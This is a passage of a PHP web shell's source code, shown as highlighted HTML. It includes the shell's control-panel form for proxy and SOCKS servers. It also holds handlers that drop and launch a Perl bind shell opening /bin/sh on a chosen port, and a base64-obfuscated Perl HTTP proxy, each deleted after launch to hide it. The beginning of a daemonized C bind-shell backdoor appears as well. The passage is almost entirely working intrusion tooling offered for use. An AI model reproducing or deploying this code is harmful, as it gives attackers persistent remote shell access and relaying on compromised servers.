<span class="lineno">1302</span> <span class="s2">&lt;tr&gt;&lt;form method=post&gt;&lt;td&gt;&lt;font color=red&gt;&lt;b&gt;Web proxy:&lt;/b&gt;&lt;/font&gt;&lt;/td&gt;&lt;td&gt;&lt;input type=submit value=&#39;Start&#39; disabled style=&#39;background-color:gray;&#39;&gt;&lt;/td&gt;&lt;td&gt;&lt;input name=port size=6 value=5548&gt;&lt;/td&gt;&lt;/form&gt;&lt;form method=post&gt;&lt;td&gt;&lt;input type=submit value=&#39;Start&#39; name=perl_proxy style=&#39;background-color:green;&#39;&gt;&lt;/td&gt;&lt;td&gt;&lt;input name=port size=6 value=5554&gt;&lt;/td&gt;&lt;/form&gt;&lt;td&gt;none&lt;/td&gt;&lt;/tr&gt;</span>
<span class="lineno">1303</span> <span class="s2">&lt;tr&gt;&lt;form method=post&gt;&lt;td&gt;&lt;font color=red&gt;&lt;b&gt;Socks 4 serv:&lt;/b&gt;&lt;/font&gt;&lt;/td&gt;&lt;td&gt;&lt;input type=submit value=&#39;Start&#39; disabled style=&#39;background-color:gray;&#39;&gt;&lt;/td&gt;&lt;td&gt;&lt;input name=port size=6 value=5549&gt;&lt;/td&gt;&lt;/form&gt;&lt;td&gt;&lt;input type=submit value=&#39;Start&#39; disabled style=&#39;background-color:gray;&#39;&gt;&lt;/td&gt;&lt;td&gt;&lt;input name=port size=6 value=5555&gt;&lt;/td&gt;&lt;td&gt;none&lt;/td&gt;&lt;/tr&gt;</span>
<span class="lineno">1304</span> <span class="s2">&lt;tr&gt;&lt;form method=post&gt;&lt;td&gt;&lt;font color=red&gt;&lt;b&gt;Socks 5 serv:&lt;/b&gt;&lt;/font&gt;&lt;/td&gt;&lt;td&gt;&lt;input type=submit value=&#39;Start&#39; disabled style=&#39;background-color:gray;&#39;&gt;&lt;/td&gt;&lt;td&gt;&lt;input name=port size=6 value=5550&gt;&lt;/td&gt;&lt;/form&gt;&lt;td&gt;&lt;input type=submit value=&#39;Start&#39; disabled style=&#39;background-color:gray;&#39;&gt;&lt;/td&gt;&lt;td&gt;&lt;input name=port size=6 value=5556&gt;&lt;/td&gt;&lt;td&gt;none&lt;/td&gt;&lt;/tr&gt;</span>
<span class="lineno">1305</span> <span class="s2">&lt;/table&gt;</span>
<span class="lineno">1306</span> <span class="s2">&lt;/center&gt;</span>
<span class="lineno">1307</span> <span class="s2">&lt;br&gt;&lt;Br&gt;</span>
<span class="lineno">1308</span> <span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno">1309</span> <span class="p">}</span><span class="c1">#end of unix</span>
<span class="lineno">1310</span> 
<span class="lineno">1311</span> 
<span class="lineno">1312</span> <span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;perl_bd&#39;</span><span class="p">]){</span>
<span class="lineno">1313</span> <span class="nv">$port</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;port&#39;</span><span class="p">];</span>
<span class="lineno">1314</span> <span class="nv">$perl_bd_scp</span> <span class="o">=</span> <span class="s2">&quot;</span>
<span class="lineno">1315</span> <span class="s2">use Socket;</span><span class="se">\$</span><span class="s2">p=</span><span class="si">$port</span><span class="s2">;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#39;tcp&#39;));</span>
<span class="lineno">1316</span> <span class="s2">setsockopt(S,SOL_SOCKET,SO_REUSEADDR,1);bind(S,sockaddr_in(</span><span class="se">\$</span><span class="s2">p,INADDR_ANY));</span>
<span class="lineno">1317</span> <span class="s2">listen(S,50);while(1){accept(X,S);if(!(</span><span class="se">\$</span><span class="s2">pid=fork)){if(!defined </span><span class="se">\$</span><span class="s2">pid){exit(0);}</span>
<span class="lineno">1318</span> <span class="s2">open STDIN,</span><span class="se">\&quot;</span><span class="s2">&lt;&amp;X</span><span class="se">\&quot;</span><span class="s2">;open STDOUT,</span><span class="se">\&quot;</span><span class="s2">&gt;&amp;X</span><span class="se">\&quot;</span><span class="s2">;open STDERR,</span><span class="se">\&quot;</span><span class="s2">&gt;&amp;X</span><span class="se">\&quot;</span><span class="s2">;exec(</span><span class="se">\&quot;</span><span class="s2">/bin/sh -i</span><span class="se">\&quot;</span><span class="s2">);</span>
<span class="lineno">1319</span> <span class="s2">close X;}}&quot;</span><span class="p">;</span>
<span class="lineno">1320</span> 
<span class="lineno">1321</span> <span class="k">if</span><span class="p">(</span><span class="nb">is_writable</span><span class="p">(</span><span class="s2">&quot;/tmp&quot;</span><span class="p">)){</span>
<span class="lineno">1322</span> <span class="nv">$fp</span><span class="o">=</span><span class="nb">fopen</span><span class="p">(</span><span class="s2">&quot;/tmp/nst_perl_bd.pl&quot;</span><span class="p">,</span><span class="s2">&quot;w&quot;</span><span class="p">);</span>
<span class="lineno">1323</span> <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span><span class="s2">&quot;</span><span class="si">$perl_bd_scp</span><span class="s2">&quot;</span><span class="p">);</span>
<span class="lineno">1324</span> <span class="nb">passthru</span><span class="p">(</span><span class="s2">&quot;nohup perl /tmp/nst_perl_bd.pl &amp;&quot;</span><span class="p">);</span>
<span class="lineno">1325</span> <span class="nb">unlink</span><span class="p">(</span><span class="s2">&quot;/tmp/nst_perl_bd.pl&quot;</span><span class="p">);</span>
<span class="lineno">1326</span> <span class="p">}</span><span class="k">else</span><span class="p">{</span>
<span class="lineno">1327</span> <span class="k">if</span><span class="p">(</span><span class="nb">is_writable</span><span class="p">(</span><span class="s2">&quot;.&quot;</span><span class="p">)){</span>
<span class="lineno">1328</span> <span class="nb">mkdir</span><span class="p">(</span><span class="s2">&quot;.nst_bd_tmp&quot;</span><span class="p">);</span>
<span class="lineno">1329</span> <span class="nv">$fp</span><span class="o">=</span><span class="nb">fopen</span><span class="p">(</span><span class="s2">&quot;.nst_bd_tmp/nst_perl_bd.pl&quot;</span><span class="p">,</span><span class="s2">&quot;w&quot;</span><span class="p">);</span>
<span class="lineno">1330</span> <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span><span class="s2">&quot;</span><span class="si">$perl_bd_scp</span><span class="s2">&quot;</span><span class="p">);</span>
<span class="lineno">1331</span> <span class="nb">passthru</span><span class="p">(</span><span class="s2">&quot;nohup perl .nst_bd_tmp/nst_perl_bd.pl &amp;&quot;</span><span class="p">);</span>
<span class="lineno">1332</span> <span class="nb">unlink</span><span class="p">(</span><span class="s2">&quot;.nst_bd_tmp/nst_perl_bd.pl&quot;</span><span class="p">);</span>
<span class="lineno">1333</span> <span class="nb">rmdir</span><span class="p">(</span><span class="s2">&quot;.nst_bd_tmp&quot;</span><span class="p">);</span>
<span class="lineno">1334</span> <span class="p">}</span>
<span class="lineno">1335</span> <span class="p">}</span>
<span class="lineno">1336</span> <span class="nv">$show_ps</span><span class="o">=</span><span class="s2">&quot;1&quot;</span><span class="p">;</span>
<span class="lineno">1337</span> <span class="p">}</span><span class="c1">#end of start perl_bd</span>
<span class="lineno">1338</span> 
<span class="lineno">1339</span> <span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;perl_proxy&#39;</span><span class="p">]){</span>
<span class="lineno">1340</span> <span class="nv">$port</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;port&#39;</span><span class="p">];</span>
<span class="lineno">1341</span> <span class="nv">$perl_proxy_scp</span> <span class="o">=</span> <span class="s2">&quot;IyEvdXNyL2Jpbi9wZXJsICANCiMhL3Vzci91c2MvcGVybC81LjAwNC9iaW4vcGVybA0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMtIGh0dHAgcHJveHkgc2VydmVyLiB6YXB1c2thamVtOiBwZXJsIHByb3h5LnBsCTgxODEgbHVib2ogcG9ydCB2aTZpIDEwMjQtDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KI3JlcXVpcmUgInN5cy9zb2NrZXQucGgiOw0KdXNlIFNvY2tldDsNCnNyYW5kICh0aW1lfHwkJCk7DQojLS0tICBEZWZpbmUgYSBmcmllbmRseSBleGl0IGhhbmRsZXINCiRTSUd7J0tJTEwnfSA9ICRTSUd7UVVJVH0gPSAkU0lHe0lOVH0gPSAnZXhpdF9oYW5kbGVyJzsNCnN1YiBleGl0X2hhbmRsZXIgew0KICAgIHByaW50ICJcblxuIC0tLSBQcm94eSBzZXJ2ZXIgaXMgZHlpbmcgLi4uXG5cbiI7DQogICAgY2xvc2UoU09DS0VUKTsNCiAgICBleGl0Ow0KDQp9DQojLS0tICBTZXR1cCBzb2NrZXQNCg0KJHwgPSAxOw0KJHByb3h5X3BvcnQgPSBzaGlmdChAQVJHVik7DQokcHJveHlfcG9ydCA9IDgxODEgdW5sZXNzICRwcm94eV9wb3J0ID1+IC9cZCsvOw0KDQokc29ja2V0X2Zvcm1hdCA9ICdTIG4gYTQgeDgnOw0KJmxpc3Rlbl90b19wb3J0KFNPQ0tFVCwgJHByb3h5X3BvcnQpOw0KJGxvY2FsX2hvc3QgPSBgaG9zdG5hbWVgOw0KY2hvcCgkbG9jYWxfaG9zdCk7DQokbG9jYWxfaG9zdF9pcCA9IChnZXRob3N0YnluYW1lKCRsb2NhbF9ob3N0KSlbNF07DQpwcmludCAiIC0tLSBQcm94eSBzZXJ2ZXIgcnVubmluZyBvbiAkbG9jYWxfaG9zdCBwb3J0OiAkcHJveHlfcG9ydCBcblxuIjsNCiMtLS0gIExvb3AgZm9yZXZlciB0YWtpbmcgcmVxdWVzdHMgYXMgdGhleSBjb21lDQp3aGlsZSAoMSkgew0KIy0tLSAgV2FpdCBmb3IgcmVxdWVzdA0KICAgIHByaW50ICIgLS0tIFdhaXRpbmcgdG8gYmUgb2Ygc2VydmljZSAuLi5cbiI7DQogICAgKCRhZGRyID0gYWNjZXB0KENISUxELFNPQ0tFVCkpIHx8IGRpZSAiYWNjZXB0ICQhIjsNCiAgICAoJHBvcnQsJGluZXRhZGRyKSA9ICh1bnBhY2soJHNvY2tldF9mb3JtYXQsJGFkZHIpKVsxLDJdOw0KICAgIEBpbmV0YWRkciA9IHVucGFjaygnQzQnLCRpbmV0YWRkcik7DQogICAgcHJpbnQgIkNvbm5lY3Rpb24gZnJvbSAiLCBqb2luKCIuIiwgQGluZXRhZGRyKSwgIiAgcG9ydDogJHBvcnQgXG4iOw0KIy0tLSAgRm9yayBhIHN1YnByb2Nlc3MgdG8gaGFuZGxlIHJlcXVlc3QuDQojLS0tICBQYXJlbnQgcHJvY2VzIGNvbnRpbnVlcyBsaXN0ZW5pbmcuDQogICAgaWYgKGZvcmspIHsNCgl3YWl0OwkJIyBGb3Igbm93IHdlIHdhaXQgZm9yIHRoZSBjaGlsZCB0byBmaW5pc2gNCgluZXh0OwkJIyBXZSB3YWl0IHNvIHRoYXQgcHJpbnRvdXRzIGRvbid0IG1peA0KICAgIH0NCiMtLS0gIFJlYWQgZmlyc3QgbGluZSBvZiByZXF1ZXN0IGFuZCBhbmFseXplIGl0Lg0KIy0tLSAgUmV0dXJuIGFuZCBlZGl0ZWQgdmVyc2lvbiBvZiB0aGUgZmlyc3QgbGluZSBhbmQgdGhlIHJlcXVlc3QgbWV0aG9kLg0KICAgKCRmaXJzdCwkbWV0aG9kKSA9ICZhbmFseXplX3JlcXVlc3Q7DQojLS0tICBTZW5kIHJlcXVlc3QgdG8gcmVtb3RlIGhvc3QNCiAgICBwcmludCBVUkwgJGZpcnN0Ow0KICAgIHByaW50ICRmaXJzdDsNCiAgICB3aGlsZSAoPENISUxEPikgew0KCXByaW50ICRfOw0KCW5leHQgaWYgKC9Qcm94eS1Db25uZWN0aW9uOi8pOw0KCXByaW50IFVSTCAkXzsNCglsYXN0IGlmICgkXyA9fiAvXltcc1x4MDBdKiQvKTsNCiAgICB9DQogICAgaWYgKCRtZXRob2QgZXEgIlBPU1QiKSB7DQoJJGRhdGEgPSA8Q0hJTEQ+Ow0KCXByaW50ICRkYXRhOw0KCXByaW50IFVSTCAkZGF0YTsNCiAgICB9DQogICAgcHJpbnQgVVJMICJcbiI7DQojLS0tICBXYWl0IGZvciByZXNwb25zZSBhbmQgdHJhbnNmZXIgaXQgdG8gcmVxdWVzdG9yLg0KICAgIHByaW50ICIgLS0tIERvbmUgc2VuZGluZy4gUmVzcG9uc2U6IFxuXG4iOw0KICAgICRoZWFkZXIgPSAxOw0KICAgICR0ZXh0ID0gMDsNCiAgICB3aGlsZSAoPFVSTD4pIHsNCglwcmludCBDSElMRCAkXzsNCglpZiAoJGhlYWRlciB8fCAkdGV4dCkgewkgICAgICMgT25seSBwcmludCBoZWFkZXIgJiB0ZXh0IGxpbmVzIHRvIFNURE9VVA0KCSAgICBwcmludCAkXzsNCgkgICAgaWYgKCRoZWFkZXIgJiYgJF8gPX4gL15bXHNceDAwXSokLykgew0KCQkkaGVhZGVyID0gMDsNCgkgICAgfQ0KIwkgICAgaWYgKCRoZWFkZXIgJiYgJF8gPX4gL15Db250ZW50LXR5cGU6IHRleHQvKSB7DQojCQkkdGV4dCA9IDE7DQojCSAgICB9DQoJfQ0KICAgIH0NCiAgICBjbG9zZShVUkwpOw0KICAgIGNsb3NlKENISUxEKTsNCiAgICBleGl0OwkJCSMgRXhpdCBmcm9tIGNoaWxkIHByb2Nlc3MNCn0NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojLS0JYW5hbHl6ZV9yZXF1ZXN0CQkJCQkJCS0tDQojLS0JCQkJCQkJCQktLQ0KIy0tCUFuYWx5emUgYSBuZXcgcmVxdWVzdC4gIEZpcnN0IHJlYWQgaW4gZmlyc3QgbGluZSBvZiByZXF1ZXN0LgktLQ0KIy0tCVJlYWQgVVJMIGZyb20gaXQsIHByb2Nlc3MgVVJMIGFuZCBvcGVuIGNvbm5lY3Rpb24uCQktLQ0KIy0tCVJldHVybiBhbiBlZGl0ZWQgdmVyc2lvbiBvZiB0aGUgZmlyc3QgbGluZSBhbmQgdGhlIHJlcXVlc3QJLS0NCiMtLQltZXRob2QuCQkJCQkJCQktLQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBhbmFseXplX3JlcXVlc3Qgew0KIy0tLSAgUmVhZCBmaXJzdCBsaW5lIG9mIEhUVFAgcmVxdWVzdA0KICAgICRmaXJzdCA9IDxDSElMRD47DQoNCiAgICAkdXJsID0gKCRmaXJzdCA9fiBtfChodHRwOi8vXFMrKXwpWzBdOw0KICAgIHByaW50ICJSZXF1ZXN0IGZvciBVUkw6ICAkdXJsIFxuIjsNCg0KIy0tLSAgQ2hlY2sgaWYgZmlyc3QgbGluZSBpcyBvZiB0aGUgZm9ybSBHRVQgaHR0cDovL2hvc3QtbmFtZSAuLi4NCiAgICAoJG1ldGhvZCwgJHJlbW90ZV9ob3N0LCAkcmVtb3RlX3BvcnQpID0gDQoJKCRmaXJzdCA9fiBtIShHRVR8UE9TVHxIRUFEKSBodHRwOi8vKFteLzpdKyk6PyhcZCopISApOw0KIy0tLSAgSWYgbm90LCBiYWQgcmVxdWVzdC4NCiAgICANCiAgICBpZiAoISRyZW1vdGVfaG9zdCkgew0KCXByaW50ICRmaXJzdDsNCgl3aGlsZSAoPENISUxEPikgew0KCSAgICBwcmludCAkXzsNCgkgICAgbGFzdCBpZiAoJF8gPX4gL15bXHNceDAwXSokLyk7DQoJfQ0KCXByaW50ICJJbnZhbGlkIEhUVFAgcmVxdWVzdCBmcm9tICIsIGpvaW4oIi4iLCBAaW5ldGFkZHIpLCAiXG4iOw0KIwlwcmludCBDSElMRCAiQ29udGVudC10eXBlOiB0ZXh0L3BsYWluIiwiXG5cbiI7DQoJcHJpbnQgQ0hJTEQgIkkgZG9uJ3QgdW5kZXJzdGFuZCB5b3VyIHJlcXVlc3QuXG4iOw0KCWNsb3NlKENISUxEKTsNCglleGl0Ow0KICAgIH0NCiMtLS0gIElmIHJlcXVlc3RlZCBVUkwgaXMgdGhlIHByb3h5IHNlcnZlciB0aGVuIGlnbm9yZSByZXF1ZXN0DQogICAgJHJlbW90ZV9pcCA9IChnZXRob3N0YnluYW1lKCRyZW1vdGVfaG9zdCkpWzRdOw0KICAgIGlmICgoJHJlbW90ZV9pcCBlcSAkbG9jYWxfaG9zdF9pcCkgJiYgKCRyZW1vdGVfcG9ydCBlcSAkcHJveHlfcG9ydCkpIHsNCglwcmludCAkZmlyc3Q7DQoJd2hpbGUgKDxDSElMRD4pIHsNCgkgICAgcHJpbnQgJF87DQoJICAgIGxhc3QgaWYgKCRfID1+IC9eW1xzXHgwMF0qJC8pOw0KCX0NCglwcmludCAiIC0tLSBDb25uZWN0aW9uIHRvIHByb3h5IHNlcnZlciBpZ25vcmVkLlxuIjsNCiMJcHJpbnQgQ0hJTEQgIkNvbnRlbnQtdHlwZTogdGV4dC9wbGFpbiIsIlxuXG4iOw0KCXByaW50IENISUxEICJJdCdzIG5vdCBuaWNlIHRvIG1ha2UgbWUgbG9vcCBvbiBteXNlbGYhLlxuIjsNCgljbG9zZShDSElMRCk7DQoJZXhpdDsNCiAgICB9DQojLS0tICBTZXR1cCBjb25uZWN0aW9uIHRvIHRhcmdldCBob3N0IGFuZCBzZW5kIHJlcXVlc3QNCiAgICAkcmVtb3RlX3BvcnQgPSAiaHR0cCIgdW5sZXNzICgkcmVtb3RlX3BvcnQpOw0KICAgICZvcGVuX2Nvbm5lY3Rpb24oVVJMLCAkcmVtb3RlX2hvc3QsICRyZW1vdGVfcG9ydCk7DQojLS0tICBSZW1vdmUgcmVtb3RlIGhvc3RuYW1lIGZyb20gVVJMDQogICAgICAgICRmaXJzdCA9fiBzL2h0dHA6XC9cL1teXC9dKy8vOw0KICAgICgkZmlyc3QsICRtZXRob2QpOw0KfQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMtLQlsaXN0ZW5fdG9fcG9ydChTT0NLRVQsICRwb3J0KQkJCQkJLS0NCiMtLQkJCQkJCQkJCS0tDQojLS0JQ3JlYXRlIGEgc29ja2V0IHRoYXQgbGlzdGVucyB0byBhIHNwZWNpZmljIHBvcnQJCQktLQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBsaXN0ZW5fdG9fcG9ydCB7DQogICAgbG9jYWwgKCRwb3J0KSA9ICRfWzFdOw0KICAgIGxvY2FsICgkc29ja2V0X2Zvcm1hdCwgJHByb3RvLCAkcGFja2VkX3BvcnQsICRjdXIsICRtYXhfcmVxdWVzdHMpOw0KICAgICRtYXhfcmVxdWVzdHMgPSAzOwkJIyBNYXggbnVtYmVyIG9mIG91dHN0YW5kaW5nIHJlcXVlc3RzDQogICAgJHNvY2tldF9mb3JtYXQgPSAnUyBuIGE0IHg4JzsNCiAgICAkcHJvdG8gPSAoZ2V0cHJvdG9ieW5hbWUoJ3RjcCcpKVsyXTsNCiAgICAkcGFja2VkX3BvcnQgPSBwYWNrKCRzb2NrZXRfZm9ybWF0LCAmQUZfSU5FVCwgJHBvcnQsICJcMFwwXDBcMCIpOw0KICAgIHNvY2tldCgkX1swXSwgJlBGX0lORVQsICZTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUgInNvY2tldDogJCEiOw0KICAgIGJpbmQoJF9bMF0sICRwYWNrZWRfcG9ydCkgfHwgZGllICJiaW5kOiAkISI7DQogICAgbGlzdGVuKCRfWzBdLCAkbWF4X3JlcXVlc3RzKSB8fCBkaWUgImxpc3RlbjogJCEiOw0KICAgICRjdXIgPSBzZWxlY3QoJF9bMF0pOyAgDQogICAgJHwgPSAxOwkJCQkjIERpc2FibGUgYnVmZmVyaW5nIG9uIHNvY2tldC4NCiAgICBzZWxlY3QoJGN1cik7DQogICAgfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIy0tCW9wZW5fY29ubmVjdGlvbihTT0NLRVQsICRyZW1vdGVfaG9zdG5hbWUsICRwb3J0KQkJLS0NCiMtLQkJCQkJCQkJCS0tDQojLS0JQ3JlYXRlIGEgc29ja2V0IHRoYXQgY29ubmVjdHMgdG8gYSBjZXJ0YWluIGhvc3QJCQktLQ0KIy0tCSRsb2NhbF9ob3N0X2lwIGlzIGFzc3VtZWQgdG8gYmUgbG9jYWwgaG9zdG5hbWUgSVAgYWRkcmVzcwktLQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBvcGVuX2Nvbm5lY3Rpb24gew0KICAgIGxvY2FsICgkcmVtb3RlX2hvc3RuYW1lLCAkcG9ydCkgPSBAX1sxLDJdOw0KICAgIGxvY2FsICgkc29ja2V0X2Zvcm1hdCwgJHByb3RvLCAkcGFja2VkX3BvcnQsICRjdXIpOw0KICAgIGxvY2FsICgkcmVtb3RlX2FkZHIsIEByZW1vdGVfaXAsICRyZW1vdGVfaXApOw0KICAgIGxvY2FsICgkbG9jYWxfcG9ydCwgJHJlbW90ZV9wb3J0KTsNCiAgICBpZiAoJHBvcnQgIX4gL15cZCskLykgew0KCSRwb3J0ID0gKGdldHNlcnZieW5hbWUoJHBvcnQsICJ0Y3AiKSlbMl07DQoJJHBvcnQgPSA2NjY3IHVubGVzcyAoJHBvcnQpOw0KICAgIH0NCiAgICAkcHJvdG8gPSAoZ2V0cHJvdG9ieW5hbWUoJ3RjcCcpKVsyXTsNCiAgICAkcmVtb3RlX2FkZHIgPSAoZ2V0aG9zdGJ5bmFtZSgkcmVtb3RlX2hvc3RuYW1lKSlbNF07DQogICAgaWYgKCEkcmVtb3RlX2FkZHIpIHsNCglkaWUgIlVua25vd24gaG9zdDogJHJlbW90ZV9ob3N0bmFtZSI7DQogICAgfQ0KDQogICAgQHJlbW90ZV9pcCA9IHVucGFjaygiQzQiLCAkcmVtb3RlX2FkZHIpOw0KICAgICRyZW1vdGVfaXAgPSBqb2luKCIuIiwgQHJlbW90ZV9pcCk7DQogICAgcHJpbnQgIkNvbm5lY3RpbmcgdG8gJHJlbW90ZV9pcCBwb3J0ICRwb3J0LlxuXG4iOw0KICAgICRzb2NrZXRfZm9ybWF0ID0gJ1MgbiBhNCB4OCc7DQogICAgJGxvY2FsX3BvcnQgID0gcGFjaygkc29ja2V0X2Zvcm1hdCwgJkFGX0lORVQsIDAsICRsb2NhbF9ob3N0X2lwKTsNCiAgICAkcmVtb3RlX3BvcnQgPSBwYWNrKCRzb2NrZXRfZm9ybWF0LCAmQUZfSU5FVCwgJHBvcnQsICRyZW1vdGVfYWRkcik7DQogICAgc29ja2V0KCRfWzBdLCAmQUZfSU5FVCwgJlNPQ0tfU1RSRUFNLCAkcHJvdG8pIHx8IGRpZSAic29ja2V0OiAkISI7DQogICAgYmluZCgkX1swXSwgJGxvY2FsX3BvcnQpIHx8IGRpZSAiYmluZDogJCEiOw0KICAgIGNvbm5lY3QoJF9bMF0sICRyZW1vdGVfcG9ydCkgfHwgZGllICJzb2NrZXQ6ICQhIjsNCiAgICAkY3VyID0gc2VsZWN0KCRfWzBdKTsgIA0KDQogICAgJHwgPSAxOwkJCQkjIERpc2FibGUgYnVmZmVyaW5nIG9uIHNvY2tldC4NCiAgICBzZWxlY3QoJGN1cik7DQp9DQoNCg==&quot;</span><span class="p">;</span>
<span class="lineno">1342</span> 
<span class="lineno">1343</span> <span class="k">if</span><span class="p">(</span><span class="nb">is_writable</span><span class="p">(</span><span class="s2">&quot;/tmp&quot;</span><span class="p">)){</span>
<span class="lineno">1344</span> <span class="nv">$fp</span><span class="o">=</span><span class="nb">fopen</span><span class="p">(</span><span class="s2">&quot;/tmp/nst_perl_proxy.pl&quot;</span><span class="p">,</span><span class="s2">&quot;w&quot;</span><span class="p">);</span>
<span class="lineno">1345</span> <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$perl_proxy_scp</span><span class="p">));</span>
<span class="lineno">1346</span> <span class="nb">passthru</span><span class="p">(</span><span class="s2">&quot;nohup perl /tmp/nst_perl_proxy.pl </span><span class="si">$port</span><span class="s2"> &amp;&quot;</span><span class="p">);</span>
<span class="lineno">1347</span> <span class="nb">unlink</span><span class="p">(</span><span class="s2">&quot;/tmp/nst_perl_proxy.pl&quot;</span><span class="p">);</span>
<span class="lineno">1348</span> <span class="p">}</span><span class="k">else</span><span class="p">{</span>
<span class="lineno">1349</span> <span class="k">if</span><span class="p">(</span><span class="nb">is_writable</span><span class="p">(</span><span class="s2">&quot;.&quot;</span><span class="p">)){</span>
<span class="lineno">1350</span> <span class="nb">mkdir</span><span class="p">(</span><span class="s2">&quot;.nst_proxy_tmp&quot;</span><span class="p">);</span>
<span class="lineno">1351</span> <span class="nv">$fp</span><span class="o">=</span><span class="nb">fopen</span><span class="p">(</span><span class="s2">&quot;.nst_proxy_tmp/nst_perl_proxy.pl&quot;</span><span class="p">,</span><span class="s2">&quot;w&quot;</span><span class="p">);</span>
<span class="lineno">1352</span> <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$perl_proxy_scp</span><span class="p">));</span>
<span class="lineno">1353</span> <span class="nb">passthru</span><span class="p">(</span><span class="s2">&quot;nohup perl .nst_proxy_tmp/nst_perl_proxy.pl </span><span class="si">$port</span><span class="s2"> &amp;&quot;</span><span class="p">);</span>
<span class="lineno">1354</span> <span class="nb">unlink</span><span class="p">(</span><span class="s2">&quot;.nst_proxy_tmp/nst_perl_proxy.pl&quot;</span><span class="p">);</span>
<span class="lineno">1355</span> <span class="nb">rmdir</span><span class="p">(</span><span class="s2">&quot;.nst_proxy_tmp&quot;</span><span class="p">);</span>
<span class="lineno">1356</span> <span class="p">}</span>
<span class="lineno">1357</span> <span class="p">}</span>
<span class="lineno">1358</span> <span class="nv">$show_ps</span><span class="o">=</span><span class="s2">&quot;1&quot;</span><span class="p">;</span>
<span class="lineno">1359</span> <span class="p">}</span><span class="c1">#end of start perl_proxy</span>
<span class="lineno">1360</span> 
<span class="lineno">1361</span> <span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c_bd&#39;</span><span class="p">]){</span>
<span class="lineno">1362</span> <span class="nv">$port</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;port&#39;</span><span class="p">];</span>
<span class="lineno">1363</span> <span class="nv">$c_bd_scp</span> <span class="o">=</span> <span class="s2">&quot;#define PORT </span><span class="si">$port</span><span class="s2"></span>
<span class="lineno">1364</span> <span class="s2">#include &lt;stdio.h&gt;</span>
<span class="lineno">1365</span> <span class="s2">#include &lt;signal.h&gt;</span>
<span class="lineno">1366</span> <span class="s2">#include &lt;sys/types.h&gt;</span>
<span class="lineno">1367</span> <span class="s2">#include &lt;sys/socket.h&gt;</span>
<span class="lineno">1368</span> <span class="s2">#include &lt;netinet/in.h&gt;</span>
<span class="lineno">1369</span> 
<span class="lineno">1370</span> <span class="s2">int soc_des, soc_cli, soc_rc, soc_len, server_pid, cli_pid;</span>
<span class="lineno">1371</span> <span class="s2">struct sockaddr_in serv_addr;</span>
<span class="lineno">1372</span> <span class="s2">struct sockaddr_in client_addr;</span>
<span class="lineno">1373</span> 
<span class="lineno">1374</span> <span class="s2">int main ()</span>
<span class="lineno">1375</span> <span class="s2">{</span>
<span class="lineno">1376</span> <span class="s2">    soc_des = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);</span>
<span class="lineno">1377</span> <span class="s2">    if (soc_des == -1)</span>
<span class="lineno">1378</span> <span class="s2">        exit(-1);</span>
<span class="lineno">1379</span> <span class="s2">    bzero((char *) &amp;serv_addr, sizeof(serv_addr));</span>
<span class="lineno">1380</span> <span class="s2">    serv_addr.sin_family = AF_INET;</span>
<span class="lineno">1381</span> <span class="s2">    serv_addr.sin_addr.s_addr = htonl(INADDR_ANY);</span>
<span class="lineno">1382</span> <span class="s2">    serv_addr.sin_port = htons(PORT);</span>
<span class="lineno">1383</span> <span class="s2">    soc_rc = bind(soc_des, (struct sockaddr *) &amp;serv_addr, sizeof(serv_addr));</span>
<span class="lineno">1384</span> <span class="s2">    if (soc_rc != 0)</span>
<span class="lineno">1385</span> <span class="s2">        exit(-1);</span>
<span class="lineno">1386</span> <span class="s2">    if (fork() != 0)</span>
<span class="lineno">1387</span> <span class="s2">        exit(0);</span>
<span class="lineno">1388</span> <span class="s2">    setpgrp();</span>
<span class="lineno">1389</span> <span class="s2">    signal(SIGHUP, SIG_IGN);</span>
<span class="lineno">1390</span> <span class="s2">    if (fork() != 0)</span>
<span class="lineno">1391</span> <span class="s2">        exit(0);</span>
<span class="lineno">1392</span> <span class="s2">    soc_rc = listen(soc_des, 5);</span>
